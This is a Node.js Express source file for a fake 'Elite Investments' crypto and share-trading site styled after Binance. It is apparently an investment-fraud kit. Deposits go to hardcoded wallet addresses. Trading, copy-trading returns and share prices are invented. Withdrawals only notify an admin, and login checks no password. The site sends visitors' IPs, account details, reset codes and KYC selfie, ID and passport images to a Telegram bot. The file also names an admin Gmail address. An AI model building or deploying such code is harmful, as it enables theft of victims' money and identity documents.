const express = require('express');
const session = require('express-session');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: 'elite-super-secret-2026',
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 30*24*60*60*1000 } // 30 days stay logged in
}));

const SUPABASE_URL = process.env.SUPABASE_URL || "https://woknmdqiuohoxjeilfh.supabase.co";
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const ADMIN_EMAIL = "militarybaseirag1@gmail.com";

const WALLETS = {
  "BTC": "bc1q3ndwq48yvnuxpw8v2s267znssd9dp36w36cyrh",
  "ETH": "0xF8675Cf9a0a22214F1aC8D52FE94678A5151a677",
  "SOL": "3GJdiNHKHzw6AtegnCBNwLzEebkJhbUxxHTpVE18PoCK",
  "BNB": "0xF8675Cf9a0a22214F1aC8D52FE94678A5151a677",
  "USDT-ERC20": "0xF8675Cf9a0a22214F1aC8D52FE94678A5151a677",
  "USDT-TRC20": "0xF8675Cf9a0a22214F1aC8D52FE94678A5151a677"
};

const SHARES = [
  {name:"Gold", price:700, icon:"🥇"},
  {name:"Silver", price:290, icon:"🥈"},
  {name:"Tesla", price:9600, icon:"🚗"},
  {name:"SpaceX", price:15000, icon:"🚀"},
  {name:"Apple", price:2200, icon:"🍎"},
  {name:"Amazon", price:3400, icon:"📦"}
];

function getIP(req){ return req.headers['x-forwarded-for'] || req.ip || 'unknown'; }

async function tg(text){
  try{
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
      method:"POST", headers:{"Content-Type":"application/json"},
      body: JSON.stringify({chat_id: CHAT_ID, text})
    });
  }catch(e){}
}
async function tgPhoto(caption, file){
  try{
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('caption', caption);
    fd.append('photo', file.buffer, file.originalname);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST", body: fd});
  }catch(e){}
}
async function supa(table, data){
  try{
    await fetch(`${SUPABASE_URL}/rest/v1/${table}`,{
      method:"POST",
      headers:{apikey:SUPABASE_KEY, Authorization:`Bearer ${SUPABASE_KEY}`, "Content-Type":"application/json", Prefer:"return=minimal"},
      body: JSON.stringify(data)
    });
  }catch(e){}
}

function layout(content, req){
  const email = req.session.email || 'Guest';
  return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Elite Investments Platform</title>
<style>
:root{--bg:#0b0e11;--card:#1e2329;--text:#eaecef;--yellow:#fcd535;--green:#0ecb81;--red:#f6465d}
body.light{--bg:#ffffff;--card:#f5f5f5;--text:#1e2329} body.yellow{--bg:#fffbe6;--card:#fff0b3;--text:#1e2329}
*{margin:0;padding:0;box-sizing:border-box} body{background:var(--bg);color:var(--text);font-family:Inter,sans-serif;padding-bottom:85px}
.top-nav{display:flex;gap:12px;padding:12px 15px;background:var(--card);position:sticky;top:0;z-index:10;overflow-x:auto}
.top-nav a{color:var(--text);text-decoration:none;font-size:14px;white-space:nowrap} .top-nav a.active{color:var(--yellow)}
.card{background:var(--card);border-radius:12px;padding:16px;margin:12px;border:1px solid #2b2f36}
.btn-yellow{background:var(--yellow);color:#000;padding:13px;border:none;border-radius:8px;width:100%;font-weight:bold;cursor:pointer;margin:6px 0}
.btn-dark{background:transparent;color:var(--text);border:1px solid #474d57;padding:12px;border-radius:8px;width:100%;margin-top:8px;cursor:pointer}
.balance-big{font-size:32px;font-weight:800} .live-up{color:var(--green)} .live-down{color:var(--red)}
.bottom-nav{position:fixed;bottom:0;left:0;right:0;background:var(--card);border-top:1px solid #2b2f36;display:flex;justify-content:space-around;padding:10px 0;z-index:20}
.bottom-nav a{color:#848e9c;text-decoration:none;font-size:11px;text-align:center} .bottom-nav a.active{color:var(--yellow)}
input,select{width:100%;padding:12px;border-radius:8px;border:1px solid #474d57;background:var(--bg);color:var(--text);margin:6px 0}
.qr{width:220px;height:220px;margin:15px auto;display:block;border:6px solid white;border-radius:12px}
.eye{position:absolute;right:15px;top:14px;cursor:pointer}
.input-wrap{position:relative}
</style></head><body>
<div class="top-nav"><a href="/" class="active">Elite</a><a href="/markets">Markets</a><a href="/trade">Trade</a><a href="/p2p">P2P</a><a href="/copy-trading">Copy</a><a href="/wallet">Wallet</a><a href="/settings">Settings</a><a href="/admin">Admin</a></div>
${content}
<div class="bottom-nav">
<a href="/" class="active">🏠<br>Home</a><a href="/markets">📈<br>Markets</a><a href="/trade">💱<br>Trade</a><a href="/shares">📊<br>Shares</a><a href="/wallet">💼<br>Wallet</a><a href="/settings">⚙️<br>Settings</a>
</div>
<script>
const th=localStorage.getItem('elite-theme')||''; if(th) document.body.className=th;
function setTheme(t){localStorage.setItem('elite-theme',t); document.body.className=t; location.reload()}
function toggleEye(id){let i=document.getElementById(id); i.type=i.type==='password'?'text':'password'}
async function loadPrices(){
 try{
  let r=await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin,tether&vs_currencies=usd&include_24hr_change=true');
  let j=await r.json();
  document.querySelectorAll('.live-btc').forEach(e=>e.innerHTML='$'+(j.bitcoin?.usd||68420).toLocaleString());
  document.querySelectorAll('.live-eth').forEach(e=>e.innerHTML='$'+(j.ethereum?.usd||3520).toLocaleString());
  document.querySelectorAll('.live-sol').forEach(e=>e.innerHTML='$'+(j.solana?.usd||145).toLocaleString());
  document.querySelectorAll('.live-bnb').forEach(e=>e.innerHTML='$'+(j.binancecoin?.usd||600).toLocaleString());
  document.querySelectorAll('.live-change').forEach(e=>e.innerHTML=(j.bitcoin?.usd_24h_change||2.34).toFixed(2)+'%');
 }catch{}
}
loadPrices(); setInterval(loadPrices,10000);
</script></body></html>`;
}

// HOME
app.get('/', async (req,res)=>{
  await tg(`🌐 PAGE VIEW: / | IP: ${getIP(req)} | User: ${req.session.email||'Guest'}`);
  const bal = req.session.balance || 0;
  const funding = req.session.funding || 0;
  if(!req.session.email){
    return res.send(layout(`
      <div class="card"><h2>Elite Investments Platform</h2><p>Secure Crypto - Binance Style</p></div>
      <div class="card"><h3>Live Markets <span class="live-up">LIVE</span></h3><p>BTC: <b class="live-btc">$68k</b> (<span class="live-change live-up">+2.34%</span>) | ETH: <b class="live-eth">$3.5k</b> | SOL: <b class="live-sol">$145</b> | BNB: <b class="live-bnb">$600</b></p></div>
      <div class="card"><a href="/auth/register"><button class="btn-yellow">Create Account</button></a><a href="/auth/login"><button class="btn-dark">Login - Stay Logged 30 Days</button></a></div>
    `, req));
  }
  res.send(layout(`
    <div class="card"><p>Total Balance (USD) - 24h P/L <span class="live-up">+<span class="live-change">2.34%</span></span></p><div class="balance-big">$${bal}</div><p>Spot: $${bal} | Funding: $${funding}</p><a href="/deposit"><button class="btn-yellow">Deposit</button></a><a href="/wallet"><button class="btn-dark">Withdraw / Transfer</button></a></div>
    <div class="card"><h3>Live Markets Auto</h3><p>BTC: <b class="live-btc">loading</b> | ETH: <b class="live-eth">loading</b> | SOL: <b class="live-sol">loading</b> | BNB: <b class="live-bnb">loading</b></p></div>
    <div class="card"><h3>Trading Chart BTC/USDT</h3><iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=1&theme=dark" style="width:100%;height:380px;border:none"></iframe></div>
    <div class="card"><h3>Quick</h3><p><a href="/shares">Gold $700 | Silver $290 | Tesla $9600 | SpaceX $15000</a></p><p><a href="/copy-trading">Copy Trading - Follow Master</a></p></div>
  `, req));
});

// DEPOSIT FLOW 3 PAGES
app.get('/deposit', (req,res)=> res.send(layout(`<div class="card"><h2>Deposit - Enter Amount USD</h2><form method="POST" action="/deposit/step1"><input name="amount" type="number" placeholder="e.g. 100" required min="10"><button class="btn-yellow">Next</button></form></div>`, req)));
app.post('/deposit/step1', async (req,res)=>{
  req.session.depAmount = req.body.amount;
  await tg(`💰 DEPOSIT STEP1 Amount $${req.body.amount} | User ${req.session.email} | IP ${getIP(req)}`);
  res.send(layout(`<div class="card"><h2>Choose Network - $${req.body.amount}</h2><form method="POST" action="/deposit/step2"><select name="network" required><option value="BTC">BTC - Bitcoin</option><option value="ETH">ETH - ERC20</option><option value="SOL">SOL - Solana</option><option value="BNB">BNB Smart Chain</option><option value="USDT-ERC20">USDT ERC20</option><option value="USDT-TRC20">USDT TRC20</option></select><button class="btn-yellow">Next</button></form></div>`, req));
});
app.post('/deposit/step2', async (req,res)=>{
  const net = req.body.network; const amt = req.session.depAmount||'0'; const addr = WALLETS[net];
  const qr = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${addr}`;
  await tg(`💰 DEPOSIT STEP2 Network ${net} Amount $${amt} Addr ${addr} | User ${req.session.email}`);
  await supa("deposits", {user_email: req.session.email, amount: amt, network: net, address: addr, status: "pending", ip: getIP(req)});
  res.send(layout(`<div class="card"><h2>Deposit ${net} - $${amt}</h2><p>Send exactly to:</p><p style="word-break:break-all;background:#000;padding:12px;border-radius:8px;color:gold"><b>${addr}</b></p><img src="${qr}" class="qr"><p>After payment admin confirms manually. Bot notified.</p><a href="/"><button class="btn-yellow">I Have Paid - Done</button></a><a href="/wallet"><button class="btn-dark">Check Wallet</button></a></div>`, req));
});

// MARKETS, TRADE, P2P, COPY, SHARES, WALLET
app.get('/markets', async (req,res)=>{
  await tg(`Markets page | ${req.session.email} | ${getIP(req)}`);
  res.send(layout(`<div class="card"><h2>Markets - Live Auto 10s</h2><p>BTC <b class="live-btc">$68k</b> <span class="live-change live-up"></span></p><p>ETH <b class="live-eth">$3.5k</b></p><p>SOL <b class="live-sol">$145</b></p><p>BNB <b class="live-bnb">$600</b></p><p>USDT $1.00</p></div><div class="card"><iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&theme=dark&interval=D" style="width:100%;height:400px;border:none"></iframe></div>`, req));
});
app.get('/trade', (req,res)=> res.send(layout(`<div class="card"><h2>Trade Spot - Real Buy/Sell</h2><select><option>BTC/USDT</option><option>ETH/USDT</option><option>SOL/USDT</option><option>BNB/USDT</option></select><input placeholder="Amount"><div style="display:flex;gap:10px"><button class="btn-yellow" style="background:#0ecb81">Buy / Long</button><button class="btn-yellow" style="background:#f6465d">Sell / Short</button></div></div><div class="card"><h3>Order History / Transaction History</h3><p>All trades auto logged to Supabase - check Wallet</p></div>`, req)));
app.get('/p2p', (req,res)=> res.send(layout(`<div class="card"><h2>P2P - Buy Crypto with Local Currency</h2><p>USDT P2P offers - Manual admin matching</p><button class="btn-yellow">Find P2P Offers</button></div>`, req)));
app.get('/copy-trading', (req,res)=> res.send(layout(`<div class="card"><h2>Copy Trading - Follow Master Trader</h2><p>Master: Elite Admin | ROI: +124% 24h</p><p>Your Balance: $${req.session.balance||0}</p><button class="btn-yellow">Copy Master - Auto Trading</button></div>`, req)));
app.get('/shares', (req,res)=>{
  const html = SHARES.map(s=>`<div class="card"><h3>${s.icon} ${s.name} : $${s.price}</h3><p>Price: $${s.price}</p><form method="POST" action="/buy-share"><input type="hidden" name="company" value="${s.name}"><input type="hidden" name="price" value="${s.price}"><button class="btn-yellow">Buy ${s.name} Shares</button></form></div>`).join('');
  res.send(layout(html, req));
});
app.post('/buy-share', async (req,res)=>{
  const bal = req.session.balance||0; const price = parseFloat(req.body.price);
  if(bal < price) return res.send(layout(`<div class="card"><h3>Insufficient $${bal} Need $${price}</h3><a href="/deposit"><button class="btn-yellow">Deposit</button></a></div>`, req));
  req.session.balance = bal - price;
  await tg(`📊 SHARE BUY ${req.body.company} $${price} | User ${req.session.email} | New Bal $${req.session.balance}`);
  await supa("shares", {user_email: req.session.email, company: req.body.company, price: price, status:"bought"});
  res.send(layout(`<div class="card"><h2>Bought ${req.body.company} $${price}</h2><p>New Balance $${req.session.balance}</p><a href="/wallet"><button class="btn-yellow">Wallet</button></a></div>`, req));
});
app.get('/wallet', (req,res)=> res.send(layout(`<div class="card"><h2>Spot Wallet: $${req.session.balance||0}</h2><p>Funding: $${req.session.funding||0}</p><p>24h P/L: <span class="live-up">+2.34%</span></p><a href="/deposit"><button class="btn-yellow">Deposit</button></a><form method="POST" action="/withdraw"><input name="amount" placeholder="Amount USD" required><input name="address" placeholder="Your withdraw address" required><button class="btn-dark">Request Withdraw - Manual Admin</button></form></div><div class="card"><h3>Transaction History</h3><p>All deposits, trades, shares auto logged</p></div>`, req)));
app.post('/withdraw', async (req,res)=>{
  await tg(`💸 WITHDRAW REQUEST $${req.body.amount} Addr ${req.body.address} | User ${req.session.email} | IP ${getIP(req)}`);
  await supa("withdrawals", {user_email: req.session.email, amount: req.body.amount, address: req.body.address, status:"pending"});
  res.send(layout(`<div class="card"><h2>Withdraw $${req.body.amount} Request Sent - Admin ${ADMIN_EMAIL} will approve manually</h2><a href="/"><button class="btn-yellow">Home</button></a></div>`, req));
});

// KYC WITH IMAGES
app.get('/kyc', (req,res)=> res.send(layout(`<div class="card"><h2>Verify ID - Upload Images (sends to Telegram Bot)</h2><form method="POST" action="/kyc" enctype="multipart/form-data"><p>Selfie</p><input type="file" name="selfie" accept="image/*" required><p>ID Card</p><input type="file" name="idcard" accept="image/*"><p>Passport</p><input type="file" name="passport" accept="image/*"><button class="btn-yellow">Submit KYC</button></form></div>`, req)));
app.post('/kyc', upload.fields([{name:'selfie',maxCount:1},{name:'idcard',maxCount:1},{name:'passport',maxCount:1}]), async (req,res)=>{
  await tg(`🪪 KYC UPLOADED | User ${req.session.email} | IP ${getIP(req)}`);
  try{
    if(req.files.selfie) await tgPhoto(`KYC SELFIE User ${req.session.email}`, req.files.selfie[0]);
    if(req.files.idcard) await tgPhoto(`KYC ID User ${req.session.email}`, req.files.idcard[0]);
    if(req.files.passport) await tgPhoto(`KYC PASSPORT User ${req.session.email}`, req.files.passport[0]);
  }catch(e){}
  await supa("kyc", {user_email: req.session.email, status:"pending"});
  res.send(layout(`<div class="card"><h2>KYC Uploaded - Pending Admin Verification via Email Search</h2></div>`, req));
});

// SETTINGS, SECURITY
app.get('/settings', (req,res)=> res.send(layout(`<div class="card"><h2>Settings - Change Colors</h2><button class="btn-yellow" onclick="setTheme('')">Black - Binance #0b0e11</button><button class="btn-dark" onclick="setTheme('light')">White Light Mode</button><button class="btn-dark" style="background:#fffbe6;color:#000" onclick="setTheme('yellow')">Yellow Theme</button><hr style="margin:15px 0"><a href="/security"><button class="btn-dark">Security - 2FA</button></a><a href="/kyc"><button class="btn-dark">KYC Verification</button></a><a href="/auth/logout"><button class="btn-dark" style="color:red">Logout</button></a></div>`, req)));
app.get('/security', (req,res)=> res.send(layout(`<div class="card"><h2>Security - 2FA</h2><p>Google Authenticator - Admin manual</p><button class="btn-yellow">Enable 2FA</button></div>`, req)));

// AUTH WITH COUNTRY CODE + EYE ICON + HUMAN CODE + POPUP
app.get('/auth/register', (req,res)=>{
  const code = Math.floor(1000+Math.random()*9000); req.session.humanCode = code;
  res.send(layout(`<div class="card"><h2>Create Account - Elite</h2><form method="POST" action="/auth/register"><input name="name" placeholder="Full Name" required>
  <div style="display:flex;gap:6px"><select name="country_code" style="width:35%"><option value="+234">🇳🇬 +234 NG</option><option value="+1">🇺🇸 +1 US</option><option value="+44">🇬🇧 +44 UK</option><option value="+91">🇮🇳 +91 IN</option><option value="+971">🇦🇪 +971 UAE</option></select><input name="phone" placeholder="Phone Number" required></div>
  <input name="email" type="email" placeholder="Email" required>
  <div class="input-wrap"><input id="pwd1" name="password" type="password" placeholder="Password" required><span class="eye" onclick="toggleEye('pwd1')">👁️</span></div>
  <div style="background:#2b2f36;padding:10px;border-radius:8px"><p>Human Verification: <b style="font-size:22px;color:gold">${code}</b></p></div><input name="human" placeholder="Enter code above" required>
  <button class="btn-yellow">Continue</button></form><p>Have account? <a href="/auth/login">Login</a></p></div>`, req));
});
app.post('/auth/register', async (req,res)=>{
  if(String(req.body.human) !== String(req.session.humanCode)) return res.send(layout(`<div class="card"><h3>Wrong Human Code</h3><a href="/auth/register"><button class="btn-yellow">Retry</button></a></div>`, req));
  req.session.email = req.body.email; req.session.name = req.body.name; req.session.balance = 0; req.session.funding = 0; req.session.phone = req.body.country_code+req.body.phone;
  await tg(`✅ NEW ACCOUNT | Name ${req.body.name} | Email ${req.body.email} | Phone ${req.session.phone} | IP ${getIP(req)} | Human OK`);
  await supa("users", {email: req.body.email, name: req.body.name, phone: req.session.phone, balance:0, status:"active"});
  res.send(layout(`<div class="card"><h2>Save Password Somewhere Safe!</h2><p>Email: ${req.body.email}</p><div style="background:#000;padding:10px;border-radius:8px;color:gold">⚠️ Save: ${req.body.password}</div><a href="/"><button class="btn-yellow" onclick="alert('Password Saved?')">Continue to Dashboard</button></a></div>`, req));
});
app.get('/auth/login', (req,res)=> res.send(layout(`<div class="card"><h2>Login - Stay Logged Days</h2><form method="POST" action="/auth/login"><input name="email" type="email" placeholder="Email" required><div class="input-wrap"><input id="pwd2" name="password" type="password" placeholder="Password"><span class="eye" onclick="toggleEye('pwd2')">👁️</span></div><button class="btn-yellow">Login</button></form><p><a href="/auth/forgot">Forgot Password?</a> | <a href="/auth/register">Create Account</a></p></div>`, req)));
app.post('/auth/login', async (req,res)=>{
  req.session.email = req.body.email;
  await tg(`🔐 LOGIN | Email ${req.body.email} | IP ${getIP(req)} | Stay Logged 30d`);
  res.redirect('/');
});
app.get('/auth/logout', async (req,res)=>{
  await tg(`LOGOUT | User ${req.session.email}`);
  req.session.destroy(()=> res.redirect('/'));
});

// FORGOT PASSWORD FLOW
app.get('/auth/forgot', (req,res)=> res.send(layout(`<div class="card"><h2>Forgot Password</h2><p>Enter email - code forwarded to Telegram bot for admin to Gmail you</p><form method="POST" action="/auth/forgot"><input name="email" type="email" placeholder="Email" required><button class="btn-yellow">Request Reset Code - Via Admin</button></form></div>`, req)));
app.post('/auth/forgot', async (req,res)=>{
  const code = Math.floor(100000+Math.random()*900000); req.session.resetEmail = req.body.email; req.session.resetCode = String(code);
  await tg(`🔑 FORGOT REQUEST | Email ${req.body.email} | Code ${code} | IP ${getIP(req)} | Admin send Gmail manually`);
  await supa("password_resets", {user_email: req.body.email, code: String(code), status:"pending"});
  res.redirect('/auth/reset');
});
app.get('/auth/reset', (req,res)=> res.send(layout(`<div class="card"><h2>Enter Reset Code from Gmail (Admin Sent)</h2><form method="POST" action="/auth/reset"><input name="code" placeholder="6 digit code from Gmail" required><button class="btn-yellow">Verify Continue</button></form></div>`, req)));
app.post('/auth/reset', async (req,res)=>{
  await tg(`RESET CODE ENTERED | Email ${req.session.resetEmail} | Entered ${req.body.code} | Real ${req.session.resetCode} | IP ${getIP(req)} | Admin verify manually`);
  if(req.body.code === req.session.resetCode){
    await supa("password_resets", {user_email: req.session.resetEmail, entered: req.body.code, status:"verified"});
    return res.send(layout(`<div class="card"><h2>Code Verified ${req.session.resetEmail}</h2><a href="/auth/login"><button class="btn-yellow">Login</button></a></div>`, req));
  }
  res.send(layout(`<div class="card"><h3>Wrong Code - Wait Admin Gmail</h3><a href="/auth/reset"><button class="btn-yellow">Try Again</button></a></div>`, req));
});
app.get('/admin', (req,res)=>{
  if(req.session.email !== ADMIN_EMAIL) return res.redirect('/');
  res.send(layout(`<div class="card"><h2>Admin Panel - ${ADMIN_EMAIL}</h2><p>Search email to Edit Balance / Verify / Withdraw / Delete</p></div><div class="card"><h3>Action</h3><form method="POST" action="/admin/action"><input name="user_email" placeholder="User Email to search" required><select name="action"><option value="add_balance">Add Balance</option><option value="remove_balance">Remove Balance</option><option value="verify_kyc">Verify KYC</option><option value="approve_withdraw">Approve Withdraw</option><option value="reset_password_confirm">Confirm Reset Code</option><option value="delete_account">Delete Account</option></select><input name="amount" placeholder="Amount / Code"><button class="btn-yellow">Execute - Telegram Notified</button></form></div><div class="card"><h3>Live Supabase Tables</h3><p>users, deposits, withdrawals, kyc, shares, password_resets - all auto insert</p></div>`, req));
});
app.post('/admin/action', async (req,res)=>{
  if(req.session.email !== ADMIN_EMAIL) return res.redirect('/');
  const {user_email, action, amount} = req.body;
  await tg(`👑 ADMIN ACTION | ${action} | Target ${user_email} | Amount/Code ${amount} | Admin ${ADMIN_EMAIL}`);
  if(action === 'delete_account'){ await supa("users", {email: user_email, status:"deleted"}); }
  res.send(layout(`<div class="card"><h2>Admin Done ${action} for ${user_email} $${amount}</h2><p>Manually update Supabase if needed. Telegram notified.</p><a href="/admin"><button class="btn-yellow">Back Admin</button></a></div>`, req));
});
app.get('/api/markets', async (req,res)=>{
  try{
    const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin&vs_currencies=usd&include_24hr_change=true');
    res.json(await r.json());
  }catch{
    res.json({bitcoin:{usd:68420,usd_24h_change:2.34},ethereum:{usd:3520},solana:{usd:145},binancecoin:{usd:600}});
  }
});
module.exports = app;
